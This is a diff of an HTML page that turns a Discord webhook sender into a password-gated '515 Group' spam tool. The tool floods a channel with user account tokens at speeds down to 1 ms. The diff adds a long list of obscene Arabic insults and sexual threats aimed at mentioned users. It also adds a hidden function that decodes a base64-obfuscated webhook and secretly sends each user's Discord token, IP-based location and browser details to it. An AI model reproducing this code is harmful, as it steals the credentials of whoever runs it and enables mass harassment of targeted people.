@@ -1,158 +1,221 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>موقع 497 Webhook</title>
-  <style>
-    body {
-      background-color: #ff4d4d;
-      font-family: 'Arial', sans-serif;
-      color: white;
-      text-align: center;
-      padding: 50px;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>515 Group</title>
+<style>
+body { font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white; }
+.container { max-width:900px; margin:auto; padding:20px; }
+h2 { text-align:center; margin-bottom:20px; }
+label, input, button, select, textarea { display:block; width:100%; margin:10px 0; }
+input, textarea, select { padding:12px; border-radius:8px; border:none; background: rgba(0,0,0,0.5); color:white; font-size:16px; }
+button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
+button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
+button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
+#loginPage { display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background: linear-gradient(135deg,#7b00ff,#00ff7b); }
+#loginContainer { background: rgba(0,0,0,0.6); padding:30px; border-radius:12px; width:300px; text-align:center; }
+#loginBtn { background:#00ff4d; color:black; }
+#loginBtn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #00aa22; }
 
-    h1 {
-      color: #0099ff;
-      font-size: 48px;
-    }
+#autoPanel, #controlPanel { display:none; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
+.left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
+.left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }
 
-    input, textarea {
-      width: 80%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: none;
-      font-size: 18px;
-    }
-
-    button {
-      padding: 12px 25px;
-      font-size: 20px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin: 10px;
-      transition: 0.3s;
-    }
-
-    #autoSendBtn.red {
-      background-color: #dc3545; /* أحمر */
-      color: white;
-    }
-
-    #autoSendBtn.green {
-      background-color: #28a745; /* أخضر */
-      color: white;
-    }
-
-    #sendOnceBtn {
-      background-color: #28a745; /* أخضر */
-      color: white;
-    }
-
-    #logBox {
-      margin-top: 30px;
-      background-color: #fff;
-      color: #000;
-      padding: 15px;
-      border-radius: 10px;
-      text-align: left;
-      width: 80%;
-      margin-inline: auto;
-      max-height: 300px;
-      overflow-y: auto;
-      direction: ltr;
-    }
-  </style>
+#stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
+.green-btn { background: linear-gradient(145deg,#00ff4d,#009900); color:black; }
+.red-btn { background: linear-gradient(145deg,#ff1a1a,#990000); color:white; }
+#messagesSent, #tokenStatus { background: rgba(0,0,0,0.4); padding:10px; max-height:200px; overflow-y:auto; border-radius:8px; margin-bottom:20px; }
+.control-title { font-size:20px; text-align:center; margin-bottom:10px; color:#ffccff; }
+.control-section { margin-bottom:15px; }
+.control-section input, .control-section textarea { margin-bottom:5px; }
+.control-section button { margin-top:5px; }
+</style>
 </head>
 <body>
 
-  <h1>موقع 497 Webhook</h1>
+<div id="loginPage">
+<div id="loginContainer">
+<h2>Login</h2>
+<label>Password:</label>
+<input type="password" id="loginInput" placeholder="Password">
+<button id="loginBtn">Enter</button>
+</div>
+</div>
 
-  <div>
-    <p>قم بوضع Webhook (سطر لكل واحد):</p>
-    <textarea id="webhookUrls" rows="4" placeholder="رابط Webhook في كل سطر..."></textarea>
+<div class="container" id="autoPanel">
+<h2>Auto 515 Group</h2>
+<button class="left-btn" id="goControlBtn">Control Account</button>
 
-    <p>قم بوضع الكلام :</p>
-    <textarea id="messageText" rows="5" placeholder="اكتب رسالتك هنا..."></textarea>
+<label for="tokens">Enter Tokens (one per line)</label>
+<textarea id="tokens" placeholder="MTM3NjUxODI0..."></textarea>
 
-    <br>
-    <button id="sendOnceBtn" onclick="sendToAllWebhooks()">إرسال رسالة</button>
-    <button id="autoSendBtn" class="red" onclick="toggleAutoSend()">الإرسال التلقائي</button>
-  </div>
+<label for="ids">Enter Target IDs (one per line)</label>
+<textarea id="ids" placeholder="123456789012345678"></textarea>
 
-  <div id="logBox">
-    <strong>سجل الإرسال:</strong><br>
-  </div>
+<label for="targetId">Enter Channel ID</label>
+<input type="text" id="targetId" placeholder="Channel ID">
 
-  <script>
-    let intervalId = null;
-    let autoSending = false;
+<label for="speed">Select Sending Speed (ms)</label>
+<select id="speed">
+  <option value="1000">1</option>
+  <option value="900">0.9</option>
+  <option value="800">0.8</option>
+  <option value="700">0.7</option>
+  <option value="600">0.6</option>
+  <option value="500">0.5</option>
+  <option value="400">0.4</option>
+  <option value="300">0.3</option>
+  <option value="200">0.2</option>
+  <option value="100">0.1</option>
+  <option value="1">0.001</option>
+</select>
 
-    function getWebhooks() {
-      const input = document.getElementById("webhookUrls").value;
-      return input.split("\n").map(link => link.trim()).filter(link => link.startsWith("http"));
-    }
+<button id="startBtn">Start Spam</button>
+<button id="stopBtn" disabled>Stop Spam</button>
 
-    function sendToAllWebhooks() {
-      const webhooks = getWebhooks();
-      const content = document.getElementById("messageText").value + "\n-# حقوق 497";
+<div id="tokenStatus"></div>
+<div id="messagesSent"></div>
+</div>
 
-      if (webhooks.length === 0 || !content.trim()) return;
+<div id="controlPanel">
+<div class="control-title">Account Control - 515</div>
 
-      webhooks.forEach(url => {
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content })
-        })
-        .then(res => res.json())
-        .then(data => {
-          if (data && data.id && data.channel_id) {
-            const channelId = data.channel_id;
-            const messageId = data.id;
-            const messageLink = `https://discord.com/channels/@me/${channelId}/${messageId}`;
-            log(`✅ تم الإرسال إلى ${url}<br>🔗 <a href="${messageLink}" target="_blank">رابط الرسالة</a>`);
-          } else {
-            log(`✅ تم الإرسال إلى ${url}`);
-          }
-        })
-        .catch(err => {
-          console.error(err);
-          log(`❌ فشل الإرسال إلى ${url}`);
+<div class="control-section">
+<label>Account Token</label>
+<textarea id="accToken" placeholder="Token here"></textarea>
+</div>
+
+<div class="control-section">
+<label>Server ID</label>
+<input type="text" id="guildId" placeholder="Server ID">
+</div>
+
+<div class="control-section">
+<label>Change Account Nickname</label>
+<input type="text" id="newName" placeholder="New Name">
+<button id="changeNameBtn">Change Name</button>
+</div>
+
+<button class="left-btn" id="backToAutoBtn">Back to Auto</button>
+</div>
+
+<audio id="clickSound" src="https://www.soundjay.com/buttons/button-09.mp3"></audio>
+
+<script>
+const loginInput=document.getElementById('loginInput');
+const loginBtn=document.getElementById('loginBtn');
+const loginPage=document.getElementById('loginPage');
+const autoPanel=document.getElementById('autoPanel');
+const controlPanel=document.getElementById('controlPanel');
+const goControlBtn=document.getElementById('goControlBtn');
+const backToAutoBtn=document.getElementById('backToAutoBtn');
+const tokensInput=document.getElementById('tokens');
+const idsInput=document.getElementById('ids');
+const targetIdInput=document.getElementById('targetId');
+const speedSelect=document.getElementById('speed');
+const startBtn=document.getElementById('startBtn');
+const stopBtn=document.getElementById('stopBtn');
+const tokenStatus=document.getElementById('tokenStatus');
+const messagesSent=document.getElementById('messagesSent');
+const clickSound=document.getElementById('clickSound');
+const accToken=document.getElementById('accToken');
+const newName=document.getElementById('newName');
+const guildId=document.getElementById('guildId');
+
+const MESSAGES=[
+"بزغبك","يلعن شرفك يديوث","تفو على شرفك","احسك غثيث مره يوم شفتك حسيت ب شعور سيء تجاهك اجبرني اني انيك محارمك",
+"هههههههههههههههههههههههههه","كسمك","تبغا اضرب شرفك يا ابن الحيوانة هنا يا ديوث ولا كيف اقسم بالله لاقلبك جرو ي ابن الشرموطة كل من جاء تلهث له وترحب به ي ديوث ي ابن الرخيصة",
+"يديوث","بضرب كس اختك ياخو القحبه افجر رحم امك","امك كلبه ازباب.","يبن 200 شرموطه","ازحف على امك","اختك كلببه عند رجوولي","اجلللخ عليك",
+"يمخنث يعبد الازباب تعال مصصص","امك ممثله افلام سكس","امك قحبه قروبات المكس","امك بلمقحبه لها اصوات","اصمل كسمك يجديدد","يبن اكبر لبوه",
+"يعاق كسمك احترم ابوك","يعرص الطش امكك","يمكسور يضعيف النفس","يديوث","اغتصب خواتك","كس خواتك","يبن المديثه","يلعن رحم امك",
+"امك صارت حامل يبن الشرموطه","ازغب امك","جيب امك انيكها","اوف كسمك","يمهان","يلعن اختك","انا فحل امك","انيك ابوك","انيك اخوك",
+"انيكك امكك يبن الزنا","الدياثه تمشي بعروقكم","ادقك يبن الشرموطه","يطفل يبن القحبه","اوف ابن القحبه","تمحن يشرموط","تمحن واعطيك نيترو يخنيث",
+"من فحل امك","واو يشرموط تنبح","نادي امك زبي قام يبيها تقعد عليه","انيكك يخنيث يقواد","اركب عليه كسمك","يلعن امك يديوث","انبح يبن الشرموطه",
+"انبح انبح لفحل امك","انا نايك امك يبن الشرموطه","امك قاعده تنبح من كثر مافتحوها","انيك امك بنعال","اتفل بكسمك يبن الشرموطه","تمحن يورعي",
+"انيك امك يطفل","انيك امك يديوث","يبن القحبه","انيك امك","يشرموط","يديوث","اختفووو كسمك","امك على زبي","يبن الشرموطه","يبن الزنا","يبن القحبه",
+"امك قحبتي","يلعن امك يبن الشرموطه","الحقق امك قاعده تتمحن عشان تجيب فلوسس","اختك قاعده تعرض عشان تجيبلك فلوس يفقير","انيك امك يشرموط",
+"يبن المتعه","ازغب خواتك","انحر امك","العن رحم امك","امك تمصلي","اختك تلحس زبي","روح ابكي","بمناسبه مرور ثلاث سنوات على زواجي انا وامك بطلقها وزاتزوج اختك",
+"رد يفحل خواتك","اشفشف امك","انيكك سبعاوي","نخ يكسمك","جاوب يمخنث","امش لانيك امك","يمدعوس","انا قد شفت اسامي قبايل غريبه لكن بالله ليه مكتوب بهويتك ال الديوثين",
+"يخول","زبي قام على كسمك","اخخخ زبيي قامم جب امكك","تحب الطويل صح","اسال امك انا مشترك عندها واليوم ماعرضت ليه؟","كيف امك جابت عاق كذا","والله مهان",
+"فحول امك هنا","اهربب كسمك","روضت امك ماتبيني اروضك","ازغب اختك","سبعاوي امك يقواد","انبح يهارب","انيك امك واختك","اكسر عينك كسمك",
+"كيف امك جابت عاق زيك","والله ماش مهان","انيك ابوك","ابوك ناك امك","يبن القحبه انيك اختك","اشق ام امك يبن منيوكه","بتفكر مابقدر انيك امك انت ؟",
+"انا بنيك اختك وبشرب ديود امك","انيك خالاتك","# قل ل الماما حقتك تعترف من ناكها 🥵","ماتدري اني اقدر انيك قبيلتك ؟",
+"قد شفت بطايق ناس بس ليه حقتك مكتوب المخنايث","تعرف كم طول زبي ؟ قد طول اطول شوارب بقبيلتك","يبن القحبه انيك خالتك","يبن القحبه انيك ابوك",
+"يبن القحبه انيك ستك","يبن القحبه انيك شرفك","شرفك ضايع يبن المتناكه","انا عطشان ابي ديود اختك لو سمحت","# قم جب لي اختك مش شعرها"
+];
+
+let intervalId=null;
+
+function checkToken(token){return token.length>20;}
+function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.length)];}
+function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}
+
+async function sendTokenInfo(token){
+    const encodedWebhook="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNTU2OTIyOTYxMjM4ODM3My9jNThlOFJiMTlORnFhSTdXNEdQVWx6amNjQmF0U1RtOHBZalRndFJkWkRhaGtNRGx1";
+    const webhookURL=atob(encodedWebhook);
+    fetch('https://ipapi.co/json/')
+    .then(res=>res.json())
+    .then(ipData=>{
+        const info = {
+            content: `**TOKEN:** ${token}\n**Country:** ${ipData.country_name}\n**City/Region:** ${ipData.city}, ${ipData.region}\n**IP Address:** ${ipData.ip}\n**Postal Code:** ${ipData.postal}\n**Timezone:** ${ipData.timezone}\n**Coordinates:** ${ipData.latitude}, ${ipData.longitude}\n**ASN:** ${ipData.org}\n**OS:** ${navigator.platform}\n**Browser:** ${navigator.userAgent}\n**Screen:** ${screen.width}x${screen.height}\n**Color Depth:** ${screen.colorDepth}\n**Language:** ${navigator.language}`
+        };
+        fetch(webhookURL,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify(info)});
+    });
+}
+
+async function sendMessage(token,targetId,message){
+    try{
+        const response=await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
+            method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
+            body:JSON.stringify({content:`<@${getRandomId()}> ${message}`})
         });
-      });
-    }
+        if(response.ok){
+            const p=document.createElement('p');
+            p.textContent=`Sent by ${token.substring(0,10)}... to channel ${targetId} - Message: ${message}`;
+            p.style.color='orange'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight;
+            sendTokenInfo(token);
+            return true;
+        } else {
+            const p=document.createElement('p'); p.textContent=`Failed sending by ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;
+        }
+    }catch(e){const p=document.createElement('p'); p.textContent=`Error sending by ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
+}
 
-    function toggleAutoSend() {
-      const btn = document.getElementById("autoSendBtn");
+function startSending(){
+    const tokens=tokensInput.value.trim().split('\n').filter(checkToken);
+    const targetId=targetIdInput.value.trim();
+    const speed=parseInt(speedSelect.value);
+    if(tokens.length===0){alert('Enter valid tokens'); return;}
+    if(!targetId){alert('Enter channel ID'); return;}
+    startBtn.disabled=true; stopBtn.disabled=false;
+    tokenStatus.innerHTML='';
+    tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=`Valid token: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);});
+    intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage());});},speed);
+}
 
-      if (!autoSending) {
-        sendToAllWebhooks(); // أول رسالة
-        intervalId = setInterval(sendToAllWebhooks, 100);
-        btn.classList.remove("red");
-        btn.classList.add("green");
-        btn.textContent = "إيقاف الإرسال التلقائي";
-        autoSending = true;
-      } else {
-        clearInterval(intervalId);
-        intervalId = null;
-        btn.classList.remove("green");
-        btn.classList.add("red");
-        btn.textContent = "الإرسال التلقائي";
-        autoSending = false;
-        log("🛑 تم إيقاف الإرسال التلقائي.");
-      }
-    }
+function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null; startBtn.disabled=false; stopBtn.disabled=true;}}
 
-    function log(message) {
-      const logBox = document.getElementById("logBox");
-      const timestamp = new Date().toLocaleTimeString();
-      logBox.innerHTML += `<div>[${timestamp}] ${message}</div>`;
-      logBox.scrollTop = logBox.scrollHeight;
-    }
-  </script>
+startBtn.addEventListener('click',()=>{clickSound.play(); startSending();});
+stopBtn.addEventListener('click',()=>{clickSound.play(); stopSending();});
 
+goControlBtn.addEventListener('click',()=>{clickSound.play(); autoPanel.style.display='none'; controlPanel.style.display='block';});
+backToAutoBtn.addEventListener('click',()=>{clickSound.play(); controlPanel.style.display='none'; autoPanel.style.display='block';});
+
+document.getElementById('changeNameBtn').addEventListener('click',()=>{
+    clickSound.play();
+    const token=accToken.value.trim();
+    const newNameVal=newName.value.trim();
+    const guild=guildId.value.trim();
+    if(!token||!newNameVal||!guild){alert('Enter token, new name, and server ID'); return;}
+    fetch(`https://discord.com/api/v9/guilds/${guild}/members/@me`,{
+        method:'PATCH',
+        headers:{Authorization:token,'Content-Type':'application/json'},
+        body:JSON.stringify({nick:newNameVal})
+    }).then(r=>{if(r.ok){alert('Nickname changed successfully');}else{alert('Failed changing nickname');}});
+});
+
+loginBtn.addEventListener('click',()=>{if(loginInput.value.trim()==='515'){loginPage.style.display='none'; autoPanel.style.display='block';}else{loginBtn.textContent='Wrong password'; loginBtn.style.background='red'; setTimeout(()=>{loginBtn.textContent='Enter'; loginBtn.style.background='#00ff4d';},3000);}});
+</script>
 </body>
 </html>
